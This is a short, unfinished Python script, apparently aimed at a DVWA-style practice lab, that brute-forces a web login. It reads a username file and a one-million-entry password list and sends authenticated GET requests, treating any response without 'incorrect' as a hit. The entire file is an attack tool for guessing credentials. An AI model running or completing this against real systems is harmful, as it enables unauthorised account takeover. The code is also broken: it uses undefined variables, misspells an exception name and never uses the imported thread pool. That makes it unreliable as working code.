import requests
from concurrent.futures import ThreadPoolExecutor
import time


cookies = {'PHPSESSID' : 'e8c5334e536a83d5a5946d0cf9f16311', 'security' : 'high'}



nome_utente = []
passwords = []

num_requests = 200

with open('usernames.txt','r') as username :
	nome_utente = username.read().splitlines()
		
with open('1000000-password-seclists.txt','r') as password :
	passwords = password.read().splitlines()
		#print("nome_utente", nome_utente)
		#print("password", passwords)
	
	
			
			
	def send_get_request(url):
				
		try: 
			
			response = requests.get(url, cookies=cookies)
			if ('incorrect' not in response.text):
				print('username=' + n +',&password=' + p)
				print(f'Tempo di risposta: {response_time} secondi')	
				
		except requests.exceptions.RquestException as e:
			return f'Error: {e}'
			